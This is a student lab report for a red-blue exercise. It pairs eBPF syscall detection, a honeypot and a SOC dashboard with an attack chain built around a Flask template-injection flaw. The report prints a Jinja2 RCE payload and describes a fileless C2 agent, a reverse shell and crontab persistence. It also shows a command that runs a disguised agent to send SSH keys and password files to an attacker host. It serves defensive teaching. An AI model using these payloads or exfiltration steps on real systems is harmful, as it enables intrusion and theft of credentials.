# Enterprise Attack-Defense Lab: A Multi-Layered Cybersecurity Exercise Using eBPF and Cyber Deception

**Course:** Network Security  
**Project Type:** Red-Blue Team Attack-Defense Exercise  
**Repository:** [GitHub — Cybersecurity-project](https://github.com/mickeytony0215-png/Cybersecurity-project)

---

## Table of Contents

1. [Introduction](#1-introduction)
   - 1.1 [Project Motivation](#11-project-motivation)
   - 1.2 [Project Objectives](#12-project-objectives)
   - 1.3 [Operational Principles](#13-operational-principles)
2. [Background and Analytical Frameworks](#2-background-and-analytical-frameworks)
3. [Problems and Attack Descriptions](#3-problems-and-attack-descriptions)
4. [The Proposed Solutions](#4-the-proposed-solutions)
5. [Tool Inventory and Environment](#5-tool-inventory-and-environment)
6. [Attack Demonstration Flow](#6-attack-demonstration-flow)
7. [Anticipated Challenges and Risks](#7-anticipated-challenges-and-risks)
8. [Conclusion](#8-conclusion)
9. [References](#9-references)

---

## 1. Introduction

### 1.1 Project Motivation

According to IBM's 2024 Cost of a Data Breach Report, the global average cost of a data breach has reached $4.88 million, with stolen credentials and phishing remaining the most common initial attack vectors [1]. Meanwhile, APT groups increasingly use covert channels such as ICMP tunneling and DNS exfiltration to maintain C2 connections, bypassing network-level security controls. Prior research has shown that the ICMP protocol lacks port-based multiplexing, making its data field easy to abuse as a covert channel [2], and MITRE ATT&CK documents ICMP-based C2 in tools like PingPull, Regin, and Cobalt Strike [4].

However, most network security courses still lean heavily toward theory -- students learn about vulnerability categories, study defense checklists, and maybe run a few Wireshark captures, but rarely get hands-on experience with both attacking and defending. The gap between what is taught in the classroom and what is practiced in real operations is significant. This is the starting point for our project: we want to build a controlled, reproducible attack-defense lab environment where participants can walk through a complete attack lifecycle -- from reconnaissance and exploitation to exfiltration -- while also implementing the corresponding defensive mechanisms and observing how both sides escalate against each other.

Another idea driving this project is that attack and defense are not one-time events but a continuous adversarial process. When you block one attack, the attacker changes tactics; when you upgrade detection, they find new evasion techniques. We designed the exercise as a multi-round engagement where both sides progressively escalate, so participants can appreciate the iterative nature of real-world cybersecurity operations. On the defense side, we use eBPF to do kernel-level behavioral detection, which is interesting because it can catch malicious activity regardless of how well the attacker encrypts their traffic.

### 1.2 Project Objectives

The goal is to build a controlled red-blue team exercise where both sides escalate over multiple rounds. Specifically, we want to:

1. Implement a realistic attack chain covering reconnaissance through actions on objectives (data exfiltration), mapped to the MITRE ATT&CK framework and the Cyber Kill Chain model.
2. Build a defense-in-depth setup with two layers -- network-level deception (honeypot + firewall blocking) and kernel-level behavioral detection (eBPF syscall monitoring with real-time process termination).
3. Structure the exercise as a 7-round engagement where the red team develops evasion techniques and the blue team upgrades detection in response, so students can see how this adversarial cycle actually plays out.
4. Introduce production-grade encryption -- upgrade the covert channel encryption from a teaching-oriented XOR cipher to AES-256-CTR (via ctypes calling OpenSSL), demonstrating that behavioral detection remains equally effective under strong encryption.
5. Tie everything together with a SOC dashboard that gives the blue team a unified view of what is happening across all defensive components.
6. Ensure safety and reproducibility -- all activities run in an isolated environment with no privilege escalation, no destructive operations, and all artifacts kept in memory or ephemeral.

### 1.3 Operational Principles

All attack and defense activities run in an isolated lab environment against a purpose-built vulnerable service -- nothing touches production systems. The red team has explicit scope constraints: no privilege escalation, no destructive operations.

The blue team deploys two defense layers:

| Layer | Mechanism | Scope | Limitation |
|-------|-----------|-------|------------|
| Network Layer | Honeypot + iptables auto-block | Blocks known malicious IPs | Attacker can change IP to bypass |
| Kernel Layer | eBPF syscall hooks + bpf_send_signal | Blocks malicious behavior regardless of source IP | Must know which syscalls to monitor |

Each layer has blind spots on its own, which is the whole point of combining them.

The demo is structured as a 7-round engagement:

| Round | Actor | Action | Outcome |
|-------|-------|--------|---------|
| 1 | Red | Reconnaissance (nmap) | Discovers target services |
| 1b | Red → Blue | Honeypot trap triggered | Red team IP blocked |
| 1c | Red | IP alias bypass | Regains network access |
| 2 | Red | SSTI + fileless C2 | Full remote control achieved |
| 3 | Blue | eBPF v1 deployed | Existing threat eliminated |
| 4 | Red | Re-attack | Blocked by eBPF |
| 5 | Red | TCP reverse shell (evasion) | Bypasses eBPF v1 |
| 6 | Blue | eBPF v2 deployed | Reverse shell detected and killed |
| 7 | Red | DNS/ICMP data exfiltration | Sensitive files extracted to attacker machine |

Every step is documented with exact commands and expected outputs in `docs/DEMO_FLOW.md` so any team member can reproduce the full exercise.

---

## 2. Background and Analytical Frameworks

### 2.1 The Cyber Kill Chain

The Lockheed Martin Cyber Kill Chain [3] breaks down a cyberattack into seven sequential phases: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control (C2), and Actions on Objectives.

We implement all seven phases of the Kill Chain:

```
Phase 1        Phase 2           Phase 3        Phase 4          Phase 5       Phase 6          Phase 7
Recon    →   Weaponize     →   Deliver    →   Exploit      →   Install   →   C2           →   Exfiltrate
nmap         memfd_create       SSTI POST      fork+execve      in-memory     ICMP/TCP         DNS/ICMP
             + AES-256-CTR      via curl       from /proc/fd    agent         covert channel   data theft
```

#### Kill Chain Coverage

| Phase | Kill Chain Stage | Our Implementation | Tools / Techniques | Demo Round |
|-------|-----------------|-------------------|-------------------|------------|
| 1 | Reconnaissance | Port scanning (SYN scan) to identify targets | nmap (`recon.sh`) | Round 1 |
| 2 | Weaponization | Build fileless payload with AES-256-CTR encrypted C2 agent; create anonymous in-memory file via `memfd_create` | `red_attacker.py`, OpenSSL libcrypto via ctypes | Round 2 |
| 3 | Delivery | Deliver payload through SSTI injection in the vulnerable Flask app | curl POST to `/diag` endpoint | Round 2 |
| 4 | Exploitation | Trigger Jinja2 template evaluation to achieve RCE; `fork()` + `execve()` from `/proc/pid/fd` to launch agent | Flask/Jinja2 SSTI (CWE-1336) | Round 2 |
| 5 | Installation | Agent runs entirely in memory with no filesystem footprint; persists as long as the process lives | `memfd_create` + in-memory execution | Round 2 |
| 6 | Command and Control | Encrypted bidirectional C2 over ICMP covert channel; later escalates to TCP reverse shell to evade eBPF detection | ICMP C2 (Round 2), TCP reverse shell (Round 5) | Rounds 2, 5 |
| 7 | Actions on Objectives | Exfiltrate sensitive files (`/etc/passwd`, SSH keys, bash history) via DNS and ICMP covert channels; data is chunked, encoded, and sent to attacker-controlled listener | `exfil_agent.py`, `exfil_listener.py`, DNS subdomain encoding + ICMP padding (T1048.003) | Round 7 |

### 2.2 MITRE ATT&CK Framework

MITRE ATT&CK is a knowledge base of adversary behavior based on real-world observations [4]. We map all our implemented techniques to ATT&CK identifiers:

| Tactic | Technique ID | Technique Name | Implementation |
|--------|-------------|----------------|----------------|
| Reconnaissance | T1595 | Active Scanning | nmap SYN port scanning |
| Initial Access | T1190 | Exploit Public-Facing Application | SSTI injection via Flask/Jinja2 |
| Execution | T1059.006 | Command and Scripting Interpreter: Python | memfd loader, reverse shell, C2 agent |
| Defense Evasion | T1620 | Reflective Code Loading | memfd_create + execve from /proc/pid/fd |
| Defense Evasion | T1027 | Obfuscated Files or Information | Base64 encoding + AES-256-CTR encryption |
| Command and Control | T1095 | Non-Application Layer Protocol | ICMP covert channel + TCP reverse shell |
| Command and Control | T1571 | Non-Standard Port | C2 and reverse shell on port 4444 |
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol | DNS/ICMP data exfiltration |
| Persistence | T1053.003 | Scheduled Task/Job: Cron | Crontab reverse shell implant (post-exploitation) |
| Discovery | T1082 | System Information Discovery | whoami, id, uname -a (post-exploitation reconnaissance) |
| Collection | T1005 | Data from Local System | Exfil agent collects /etc/passwd, SSH keys, bash history from target |
| Defense Evasion | T1070.003 | Indicator Removal: Clear Command History | history -c (trace cleanup) |
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Exfil agent self-deletes after completion |

Note on T1620: We use Reflective Code Loading rather than T1055.009 (Proc Memory) because our technique executes code from the process's own anonymous file descriptor (`/proc/self/fd/N` via `execve`), not by injecting into another process's address space via `/proc/[pid]/mem`. The distinction matters -- T1055.009 describes cross-process injection, while our attack is self-contained in-memory execution.

### 2.3 Extended Berkeley Packet Filter (eBPF)

eBPF allows sandboxed programs to run in Linux kernel space without modifying kernel source code or loading kernel modules [5]. Originally designed for packet filtering, it has since become a general-purpose in-kernel virtual machine used for networking, observability, and security.

What makes eBPF useful for our defense layer:

- **Kernel-space execution**: eBPF programs see all syscalls with zero context-switch overhead, and userspace processes cannot evade them.
- **Safety guarantees**: The eBPF verifier checks every program before loading -- no unbounded loops, no out-of-bounds access, no kernel crashes.
- **Active response**: The `bpf_send_signal()` helper, added to the kernel in 2019 (Linux 5.3) [6] -- two years after the eBPF foundations described in [5] -- lets eBPF programs send SIGKILL directly from kernel space, so we can terminate a malicious process without a userspace round-trip.
- **Tracepoint hooks**: We attach to syscall entry points (`sys_enter_*`), which fire before the syscall handler runs. This means we can detect and block operations before they complete.

In this project, we hook six tracepoints: `sys_enter_memfd_create`, `sys_enter_execve`, `sys_enter_socket`, `sys_enter_connect`, `sys_enter_dup2`, and `sys_enter_dup3`.

### 2.4 Cyber Deception and Honeypots

Cyber deception uses decoy systems to detect and analyze adversary behavior [7]. A honeypot is a security resource that has no legitimate purpose -- any interaction with it is inherently suspicious.

We deploy a low-interaction honeypot emulating an SSH server [12] on port 2222. When an attacker connects during reconnaissance, the honeypot logs the source IP and triggers automated firewall blocking via iptables. Since no legitimate user has any reason to connect to this service, every connection is unauthorized by definition, which means zero false positives.

### 2.5 AES-256-CTR Encryption via OpenSSL

AES in Counter (CTR) mode is a NIST-standardized symmetric encryption scheme [8]. AES-256-CTR works as a stream cipher: it encrypts successive counter values with AES-256 to produce a keystream, then XORs that keystream with the plaintext. Several properties make it well-suited for our use case:

- **IND-CPA security**: With a random IV per message, identical plaintexts produce different ciphertexts, preventing pattern analysis.
- **No padding required**: CTR mode produces ciphertext of the same length as the plaintext, which is important for network protocols with size constraints such as ICMP.
- **Parallelizable**: Counter blocks are independent of each other, enabling hardware acceleration.

The implementation calls OpenSSL's libcrypto [14] through Python ctypes, so we get production-grade encryption without needing any pip-installed packages.

---

## 3. Problems and Attack Descriptions

### 3.1 Server-Side Template Injection (SSTI)

**Problem**: The target application (`target_app.py`) is a Flask web app that uses Python f-string interpolation to embed user input directly into a Jinja2 template before rendering. This is a textbook Server-Side Template Injection vulnerability (CWE-1336; also classified under the more commonly cited CWE-94, Code Injection) [9].

**Mechanism**: When a user submits a diagnostic query, the application constructs the template as:

```python
template = f"<pre>Query: {user_input}</pre>"
render_template_string(template)
```

If `user_input` contains Jinja2 expression delimiters (`{{ }}`), the template engine evaluates them as code. An attacker can traverse Python's object model to reach `os.popen()` and achieve Remote Code Execution (RCE):

```
{{ config.__class__.__init__.__globals__['os'].popen('COMMAND').read() }}
```

**Impact**: Full RCE with the privileges of the Flask process.

### 3.2 Fileless Malware via memfd_create

**Problem**: Traditional malware detection relies on scanning files on disk. The `memfd_create` syscall (Linux 3.17+, syscall 319 on x86_64) creates anonymous files that exist entirely in RAM with no filesystem entry, which means file-based detection tools never see them [10].

**Mechanism**: The attack chain is:

1. `memfd_create("", 0)` -- creates an anonymous file descriptor in kernel tmpfs
2. `write(fd, agent_code)` -- writes the C2 agent into the anonymous fd
3. `fork()` -- parent returns to let the web server respond normally
4. `execve("/usr/bin/python3", ["/proc/<pid>/fd/<N>"])` -- child executes the agent from the anonymous fd

The resulting process runs entirely from memory. The agent binary never touches the filesystem, leaving no artifacts for forensic analysis or antivirus scanning.

### 3.3 ICMP Covert Command and Control Channel

**Problem**: TCP/UDP-based C2 channels are monitored by firewalls and IDS/IPS. ICMP (RFC 792) is usually allowed through because blocking it breaks basic network diagnostics [11].

**Mechanism**: The C2 channel embeds encrypted commands and responses in the payload field of ICMP echo request (type 8) packets:

- **ICMP ID field (0x1337)** as a traffic discriminator
- **Magic byte (0xDE)** for quick payload validation
- **AES-256-CTR encryption** with per-packet random IV for payload confidentiality
- **Chunked transfer** (480-byte chunks) for large command outputs

Both the C2 server and agent send ICMP type 8 packets; kernel-generated auto-replies (type 0) are ignored.

### 3.4 TCP Reverse Shell (eBPF Evasion)

**Problem**: When the blue team deploys eBPF-based detection that monitors `memfd_create`, `execve` from `/proc/fd`, and raw ICMP sockets, the attacker needs to find a way around it. A standard TCP reverse shell avoids all three of those monitored syscall patterns.

**Mechanism**: The evasion replaces the fileless ICMP C2 with a conventional reverse shell:

1. `fork()` -- background the shell process
2. `socket(AF_INET, SOCK_STREAM, 0)` -- regular TCP socket (not SOCK_RAW)
3. `connect(attacker_ip, 4444)` -- outbound TCP connection
4. `dup2(sock_fd, 0/1/2)` -- redirect stdin, stdout, stderr to the socket
5. `pty.spawn("/bin/bash")` -- spawn an interactive shell

This bypasses all three eBPF v1 hooks: it uses standard TCP (not raw ICMP), never calls `memfd_create`, and does not execute from `/proc/fd`.

### 3.5 DNS/ICMP Data Exfiltration

**Problem**: After establishing access, an attacker may want to exfiltrate data. HTTP, FTP, and SCP are typically monitored, but DNS and ICMP channels often are not.

**Mechanism**: The exfiltration agent collects sensitive files (`/etc/passwd`, SSH keys, bash history, application source code) and sends them out through:

- **DNS channel**: Data is Base32-encoded and embedded as subdomain labels in DNS queries to a controlled domain (`<data>.x.exfil.local`). A fake DNS server on the attacker side reassembles the fragments.
- **ICMP channel**: Data is hex-encoded and embedded in the padding pattern of ICMP echo requests via the `ping -p` option.

Both channels use chunked transfer with sequence numbers, checksums for integrity verification, and randomized inter-packet delays to evade pattern-based detection.

---

## 4. The Proposed Solutions

### 4.1 Layer 1: Cyber Deception -- Honeypot and Network MDR

**Component 1 -- Honeypot (`target/honeypot.py`)**:

A low-interaction SSH honeypot listens on port 2222, presenting a realistic OpenSSH 8.9p1 banner that fools service detection tools (e.g., nmap `-sV`). Any connection is logged to `trap.log` with timestamp, source IP, port, and client data.

**Component 2 -- Network MDR (`blue_team/blue_mdr_network.py`)**:

A monitoring daemon polls `trap.log` for new attacker IP entries. Upon detection, it executes:

```
iptables -I INPUT 1 -s <attacker_ip> -j DROP
```

The rule is inserted at position 1 (highest priority) in the INPUT chain, so it takes precedence over any existing ACCEPT rules. This blocks the attacker from reaching any service on the machine.

**Effectiveness**: Zero false positives -- any connection to the honeypot is unauthorized by definition.

**Discussion -- port choice**: We use port 2222, which an experienced attacker running nmap might recognize as a common honeypot port. In a production deployment you would put the honeypot on a more convincing port (e.g., 22). We keep 2222 in the lab to avoid conflicting with real SSH, and because the demo explicitly shows the attacker falling for it during reconnaissance.

**Limitation**: IP-based blocking is easily circumvented by changing the source IP (e.g., via IP aliasing). This is why we need Layer 2.

### 4.2 Layer 2: Kernel-Level Detection -- eBPF MDR

**Component 3 -- eBPF MDR v1 (`blue_team/blue_ebpf_mdr.py`)**:

Three eBPF tracepoint hooks detect fileless malware:

| Hook | Tracepoint | Detection Logic |
|------|-----------|-----------------|
| Hook 1 | `sys_enter_memfd_create` | Any call to memfd_create on a server is suspicious; PID recorded for correlation |
| Hook 2 | `sys_enter_execve` | Pattern-match filename for `/proc/<pid>/fd/` -- indicates execution from anonymous memory |
| Hook 3 | `sys_enter_socket` | Detect `socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)`; correlate with memfd PID for high-confidence C2 detection |

When `--kill` mode is enabled, `bpf_send_signal(SIGKILL)` terminates the malicious process from kernel space before the syscall completes. A cold-start scanner also checks `/proc/*/exe` for existing `memfd:` processes at startup.

**Component 4 -- eBPF MDR v2 (`blue_team/blue_ebpf_mdr_v2.py`)**:

Keeps all v1 hooks and adds three new ones to detect reverse shells:

| Hook | Tracepoint | Detection Logic |
|------|-----------|-----------------|
| Hook 4 | `sys_enter_connect` | Check destination port against a configurable suspicious-ports list (default: 4444, 4445, 5555, 1234, 1337) |
| Hook 5 | `sys_enter_dup2` | Track per-PID bitmask; when fd 0, 1, and 2 are all redirected, that confirms a reverse shell |
| Hook 6 | `sys_enter_dup3` | Same as Hook 5, covering Python's `os.dup2(fd, fd2, inheritable=False)` code path |

The `connect` hook gives fast port-based detection at connection time, while the `dup2/dup3` hooks provide port-agnostic detection based on the behavioral signature of fd redirection.

**Limitation of port-based detection**: If the attacker uses a common port like 443 or 80 for the reverse shell, the `connect` hook's suspicious-port check would miss it. However, the `dup2/dup3` behavioral hooks still catch the shell because redirecting all three standard file descriptors (0, 1, 2) to a socket is inherently suspicious regardless of the destination port.

### 4.3 Real-Time Operational Visibility -- SOC Dashboard

**Component 5 -- SOC Dashboard (`blue_team/soc_dashboard.py`)**:

A Flask-based web application (port 8080) that aggregates events from all defensive components into a real-time dark-themed console. Features include:

- **Server-Sent Events (SSE)** for real-time streaming to the browser
- **Multi-source ingestion**: reads `trap.log` (honeypot events) and `soc_events.jsonl` (eBPF alerts, iptables blocks)
- **HTTP POST API** (`/api/event`) for programmatic event submission
- **Statistics cards**: total events, blocked IPs, process kills, critical alerts
- **Color-coded severity**: CRITICAL (red), HIGH (yellow), MEDIUM (blue), INFO (gray)

Blue team tools write to `soc_events.jsonl` via the `--soc-log` flag, so the dashboard shows eBPF detections and network blocks alongside honeypot events.

### 4.4 Encryption Upgrade -- AES-256-CTR

The covert C2 channel encryption was upgraded from XOR to AES-256-CTR:

| Property | XOR (Original) | AES-256-CTR (Upgraded) |
|----------|----------------|----------------------|
| Algorithm | XOR stream cipher | AES-256 in CTR mode |
| Key derivation | Fixed 16-byte plaintext key | SHA-256(shared_secret) → 32 bytes |
| IV/Nonce | None | Random 16-byte IV per packet |
| Known-plaintext resistance | Trivially broken | Computationally infeasible |
| Implementation | Pure Python | ctypes + OpenSSL libcrypto |
| Dependencies | None | System libcrypto (pre-installed on Linux) |

This upgrade illustrates two things: first, real-world malware increasingly uses strong cryptography, and second, behavior-based detection (eBPF) still works regardless of encryption strength because it monitors syscall patterns, not payload content.

### 4.5 Defense-in-Depth Summary

```
┌─────────────────────────────────────────────────────┐
│  Layer 1 — Network (Cyber Deception)                │
│  honeypot.py (port 2222) → trap.log →               │
│  blue_mdr_network.py → iptables DROP                │
│  Detects: reconnaissance, blocks known-bad IPs       │
├─────────────────────────────────────────────────────┤
│  Layer 2 — Kernel (eBPF Behavioral Detection)       │
│  v1: memfd_create + execve + raw ICMP socket         │
│  v2: + connect (suspect port) + dup2/dup3 (shell)   │
│  Detects: malicious behavior, regardless of source   │
├─────────────────────────────────────────────────────┤
│  Visibility — SOC Dashboard (port 8080)             │
│  Aggregates all events in real-time web UI           │
└─────────────────────────────────────────────────────┘
```

**Known gap -- data exfiltration**: The current two-layer defense focuses on detecting C2 establishment and malicious process behavior. It does not include monitoring for data exfiltration channels (DNS tunneling, ICMP data embedding) described in Section 3.5. Detecting DNS exfiltration would require a separate mechanism -- for example, analyzing DNS query patterns for abnormally long subdomain labels or high query frequency to uncommon domains. This is outside the scope of our current eBPF hooks (which monitor process-level syscalls, not network payload content) and is left as a known limitation. In the demo, we show exfiltration succeeding to illustrate that even a two-layer defense has blind spots.

---

## 5. Tool Inventory and Environment

### 5.1 Dual-Machine Architecture

We use two machines because WSL2 does not have kernel headers, which means eBPF cannot be compiled there. The red team tools do not need eBPF, so they run fine on WSL2.

| Machine | Role | OS | What runs here |
|---------|------|----|----------------|
| Lab server | Target + Blue Team | Ubuntu 24.04 (native) | target_app.py, honeypot.py, eBPF MDR, SOC dashboard |
| Student laptop | Red Team (attacker) | Ubuntu 22.04 (WSL2) | recon, exploit, C2 server, reverse shell listener |

Both machines run `bash setup_env.sh` which auto-detects WSL2 and installs the appropriate packages. A Python venv (`.venv/`) isolates all dependencies.

### 5.2 Red Team Tools

| Tool | File | What it does | Requires sudo |
|------|------|-------------|---------------|
| Fileless ICMP C2 | `red_team/red_attacker.py` | Main attack: SSTI → memfd_create → AES-256-CTR ICMP C2 shell | Yes (raw ICMP socket) |
| TCP Reverse Shell | `red_team/red_reverse_shell.py` | eBPF v1 bypass: fork → connect → dup2 → pty.spawn | No |
| WAF Bypass Exploit | `red_team/exploit.py` | Backup: Base64 + `${IFS}` space evasion | No |
| Recon Script | `red_team/recon.sh` | Automated nmap SYN scan (no -sV to avoid triggering honeypot) | Yes (raw SYN) |
| IP Switch | `red_team/ip_switch.sh` | IP alias add/remove to bypass iptables blocks | Yes |
| Exfil Agent | `red_team/exfil_agent.py` | Deployed on target: collects files, sends via DNS/ICMP | No |
| Exfil Listener | `red_team/exfil_listener.py` | Runs on attacker: fake DNS server + ICMP receiver | Yes (port 53 + raw ICMP) |
| Deploy Helper | `red_team/deploy_agent.sh` | Generates base64 one-liner to deploy exfil agent | No |
| Post-Exploit | `red_team/post_exploit.sh` | System enumeration + crontab persistence | No |

### 5.3 Blue Team Tools

| Tool | File | What it does | Requires sudo |
|------|------|-------------|---------------|
| eBPF MDR v1 | `blue_team/blue_ebpf_mdr.py` | 3 syscall hooks: memfd_create, execve, socket | Yes (eBPF) |
| eBPF MDR v2 | `blue_team/blue_ebpf_mdr_v2.py` | 6 hooks: v1 + connect, dup2, dup3 | Yes (eBPF) |
| Network MDR | `blue_team/blue_mdr_network.py` | Watches trap.log → auto iptables block | Yes (iptables) |
| SOC Dashboard | `blue_team/soc_dashboard.py` | Real-time web UI on port 8080 | No |

### 5.4 Target Services

| Service | File | Port | Purpose |
|---------|------|------|---------|
| Diagnostic API | `target/target_app.py` | 9999 | Flask app with SSTI vulnerability (the actual attack target) |
| SSH Honeypot | `target/honeypot.py` | 2222 | Fake SSH server that logs IPs to trap.log (deception trap) |

### 5.5 External Dependencies

| Dependency | Used by | Notes |
|------------|---------|-------|
| nmap | recon.sh | Port scanning; installed via apt |
| BCC (python3-bpfcc) [13] | eBPF MDR v1/v2 | eBPF compiler; only on native Linux (not WSL2) |
| linux-headers | eBPF MDR v1/v2 | Required for eBPF compilation; only on native Linux |
| OpenSSL libcrypto | red_attacker.py | AES-256-CTR encryption via ctypes; pre-installed on all Linux |
| Flask | target_app.py, soc_dashboard.py | Web framework; installed in venv |
| netcat (nc) | manual testing | Used to trigger honeypot; usually pre-installed |

---

## 6. Attack Demonstration Flow

The full demo takes about 20-25 minutes across 7 rounds. Here is the condensed flow with actual commands. (Complete version with expected outputs: `docs/DEMO_FLOW.md`)

### Setup (all terminals)

> **Important**: All Lab-side terminals (target, honeypot, MDR, eBPF) must run from the **same repo clone**. The honeypot writes `trap.log` relative to its script path, and the MDR reads from the same relative path. Running from different clones causes path mismatch.

```bash
cd ~/cybersecurity && source .venv/bin/activate
```

### Round 1 — Recon + Honeypot Trap

```bash
# Lab T1: start target + honeypot
sudo .venv/bin/python3 target/target_app.py
sudo .venv/bin/python3 target/honeypot.py

# Lab T2: start network MDR
sudo .venv/bin/python3 blue_team/blue_mdr_network.py --cleanup

# WSL2 T4: scan target
sudo bash red_team/recon.sh <TARGET_IP>
# → discovers port 2222 (honeypot) and 9999 (real target)

# WSL2 T4: prepare backup IP BEFORE triggering honeypot
sudo bash red_team/ip_switch.sh add
# → backup IP ready, prevents lockout when original IP gets blocked

# WSL2 T4: touch the honeypot → get blocked
nc -v <TARGET_IP> 2222
# → MDR auto-blocks attacker's original IP via iptables

# WSL2 T4: continue attack using backup IP
curl -s --interface <BACKUP_IP> http://<TARGET_IP>:9999/
# → backup IP is not blocked, attack continues
```

### Round 2 — Red Team Attack (Blue OFF)

```bash
# WSL2 T3: start C2 server
sudo .venv/bin/python3 red_team/red_attacker.py -t <TARGET_IP> -l <ATTACKER_IP>

# WSL2 T4: paste the curl command printed by T3
curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."
# → agent deploys in-memory, C2 shell obtained
```

### Round 3-4 — Blue Deploys eBPF v1

```bash
# Lab T2: start eBPF v1
sudo .venv/bin/python3 blue_team/blue_ebpf_mdr.py --kill
# → cold-start scan finds and kills existing agent
# → re-attacks are blocked at memfd_create
```

### Round 5 — Red Bypasses v1 with Reverse Shell

```bash
# WSL2 T3: switch to reverse shell attack
.venv/bin/python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>

# WSL2 T4: paste curl → reverse shell connects
# → eBPF v1 sees nothing (no memfd, no ICMP, no /proc/fd exec)
```

### Round 6 — Blue Upgrades to eBPF v2

```bash
# Lab T2: upgrade to v2
sudo .venv/bin/python3 blue_team/blue_ebpf_mdr_v2.py --kill

# WSL2 T4: re-attack with reverse shell
# → v2 detects connect() to port 4444 + dup2 fd hijack → SIGKILL
```

### Round 7 — Red Exfiltrates Data (Defense Gap)

```bash
# WSL2 T3: start exfil listener
sudo .venv/bin/python3 red_team/exfil_listener.py

# In existing shell session on target (from Round 5 re-attack before v2 kills it):
# Deploy exfil agent via base64 one-liner
echo '<base64_of_exfil_agent.py>' | base64 -d > /tmp/.cache_update.py
python3 /tmp/.cache_update.py <ATTACKER_IP>
# → agent collects /etc/passwd, SSH keys, bash history
# → sends via DNS queries to attacker's fake DNS server
# → eBPF v2 does not detect this (no memfd, no reverse shell pattern)

# WSL2 T3: check received files
ls -la loot/
```

This round demonstrates that even with both defense layers active, data exfiltration via DNS/ICMP covert channels goes undetected -- the current eBPF hooks monitor process behavior (memfd_create, reverse shell fd patterns), not network payload content.

---

## 7. Anticipated Challenges and Risks

### 7.1 Environment and Compatibility

| Challenge | Description | Our mitigation |
|-----------|-------------|---------------|
| WSL2 has no kernel headers | eBPF programs cannot compile on WSL2, because Microsoft's WSL2 kernel ships without linux-headers | Split into dual-machine architecture: red team on WSL2 (no eBPF needed), blue team on native Linux |
| BCC version mismatches | BCC API changes between Ubuntu 22.04 and 24.04 | Pin to `python3-bpfcc` from apt; test on both versions |
| OpenSSL library path varies | `ctypes.util.find_library('crypto')` may return different paths across distros | Fallback chain: try `find_library('crypto')`, then `libcrypto.so`, then `libcrypto.so.3` |
| venv vs system BCC | BCC is a system package but venv isolates from system; `import bcc` may fail | Create venv with `--system-site-packages` so BCC is accessible |

### 7.2 Attack Execution

| Challenge | Description | Our mitigation |
|-----------|-------------|---------------|
| ICMP might be blocked | Some lab networks block ICMP at the gateway level | Test with `ping` first; if blocked, the reverse shell attack (TCP) still works |
| Flask runs as root | The SSTI → memfd_create chain needs the Flask process to have `CAP_NET_RAW` for ICMP raw sockets | In the lab we run Flask with sudo; document that this is a lab simplification |
| Race condition on trap.log | If honeypot and MDR use different paths for trap.log, MDR won't see new entries | Both scripts resolve trap.log to absolute project-root path automatically |
| eBPF verifier rejects code | eBPF programs have strict constraints (no unbounded loops, 512-byte stack) | Use bounded loops with fixed iteration counts; keep per-hook logic simple |

### 7.3 Defense Limitations (by design)

These are not bugs -- they are limitations we intentionally leave in place so the demo can show escalation:

| Limitation | Why we keep it | What it demonstrates |
|------------|---------------|---------------------|
| Honeypot only blocks known IPs | Attacker can change IP to bypass | Network-layer defense alone is not enough |
| eBPF v1 only monitors 3 syscalls | Reverse shell uses different syscalls | Defenders must continuously expand coverage |
| Suspicious port list is static | Reverse shell on port 80/443 would evade port-based detection | But dup2/dup3 behavioral detection still catches it |
| Shared secret is hardcoded | In production this would be a vulnerability | This is a lab; we focus on the detection side, not key management |

### 7.4 Demo Day Risks

| Risk | Impact | Contingency |
|------|--------|-------------|
| Network connectivity between machines | Cannot run cross-machine attacks | Pre-test with `ping` and `curl`; have a single-machine fallback using localhost |
| eBPF fails to load | Blue team demo is broken | Have a pre-recorded terminal session as backup |
| Port conflicts (2222, 9999, 8080) | Services fail to bind | Run `cleanup.sh` before each demo to kill leftover processes |
| Previous demo artifacts interfere | MDR skips old entries; stale iptables rules persist | Always run `sudo bash cleanup.sh` before starting |

---

## 8. Conclusion

This project shows that no single defense layer is enough on its own. Network-layer defenses like honeypots and firewalls get bypassed as soon as the attacker changes their IP. Kernel-layer detection (eBPF v1) works until the attacker switches to a different set of syscalls. It is only by stacking multiple independent detection mechanisms that we get something reasonably robust.

The 7-round structure makes this concrete. When eBPF v1 killed the fileless ICMP C2 agent, the red team pivoted to a standard TCP reverse shell that did not trigger any of the monitored hooks. The blue team had to deploy eBPF v2 with additional hooks for `connect()` and `dup2()` to catch the new technique. This kind of back-and-forth is what real security operations look like, and it is hard to appreciate from reading about it in a textbook.

The encryption upgrade from XOR to AES-256-CTR is also instructive. Making the C2 traffic unreadable through payload inspection did nothing to stop eBPF detection, because eBPF watches what the process *does* (which syscalls it makes) rather than what the traffic *contains*. This is a useful lesson for understanding why behavioral detection matters.

On the visibility side, the SOC dashboard turned out to be more useful than expected for understanding the full attack picture. Without it, the blue team would be looking at isolated log files from different components and trying to mentally piece together what happened.

Fileless techniques pose a real challenge to traditional defenses. The C2 agent running entirely in memory via `memfd_create` leaves no filesystem trace whatsoever -- conventional antivirus and forensic tools simply cannot see it. This demonstrates the necessity of kernel-level behavioral monitoring like eBPF, which observes what processes do rather than scanning for files on disk.

Data exfiltration remains a blind spot in the current defense architecture. Even with both defense layers active, the red team successfully extracted sensitive files (`/etc/passwd`, SSH keys, bash history) from the target via DNS subdomain encoding and ICMP payload embedding. The eBPF hooks monitor process-level syscall behavior (memfd_create, reverse shell fd hijacking), but DNS exfiltration uses standard UDP port 53 queries that do not trigger any monitored patterns. This demonstrates that defense-in-depth is an ongoing process -- deployment is not the finish line, and defenders must continuously expand their detection surface to cover new attack vectors.

Overall, the project implements 13 ATT&CK techniques (spanning 9 tactic categories) and 7 corresponding detection capabilities across two defense layers, giving us hands-on experience with both offensive and defensive operations in a controlled environment -- including the discovery that data exfiltration through covert channels remains undetected by the current behavioral monitoring approach.

---

## 9. References

[1] IBM Security, "Cost of a Data Breach Report 2024," IBM Corporation, 2024. Available: https://www.ibm.com/reports/data-breach

[2] A. Singh, O. Nordstrom, C. Lu, and A. L. M. dos Santos, "Malicious ICMP Tunneling: Defense against the Vulnerability," in *ACISP 2003*, Lecture Notes in Computer Science, vol. 2727, Springer, 2003. DOI: 10.1007/3-540-45067-X_20

